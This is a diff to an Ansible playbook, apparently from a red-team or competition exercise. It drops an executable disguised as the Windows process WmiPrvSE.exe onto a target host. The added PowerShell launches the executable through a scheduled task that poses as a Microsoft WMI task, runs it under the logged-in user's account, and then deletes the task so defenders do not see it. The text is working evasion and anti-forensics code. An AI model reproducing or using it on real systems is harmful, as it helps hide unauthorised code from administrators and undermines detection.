@@ -20,19 +20,36 @@
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
 
-    - name: Check for enrollment and launch if found
+    - name: Check for enrollment and launch in user session
       ansible.windows.win_shell: |
-        # Exact path from your screenshot
         $stateFile = "C:\Users\charliebrown.TEAM1PEANUTS.000\AppData\Roaming\gundo\state.json"
         
         if (Test-Path $stateFile) {
-            Write-Host "[+] Found state.json. Launching in background..."
-            Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
+            Write-Host "[+] Found state.json. Launching under WMI disguise..."
+            
+            # Create a scheduled task with a stealthy WMI name and path
+            $action = New-ScheduledTaskAction -Execute "{{ target_dir }}\WmiPrvSE.exe" -Argument "client"
+            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+            
+            # Run as the currently logged-in Charlie Brown user
+            $principal = New-ScheduledTaskPrincipal -UserId "TEAM1\charliebrown" -LogonType Interactive
+            
+            # Register the task under the \Microsoft\Windows\WMI\ folder
+            Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI\" -Force
+            
+            # Start the task immediately
+            Start-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI\"
+            
+            # Wait 2 seconds, then delete the task so they don't see it in the Task Scheduler later
+            Start-Sleep -Seconds 2
+            Unregister-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI\" -Confirm:$false
+            
+            Write-Host "[+] Task executed and cleaned up."
         } else {
             Write-Host "[-] Still cannot find state.json."
         }
       register: launch_result
-
+      
     - name: Show result
       debug:
         msg: "{{ launch_result.stdout }}"
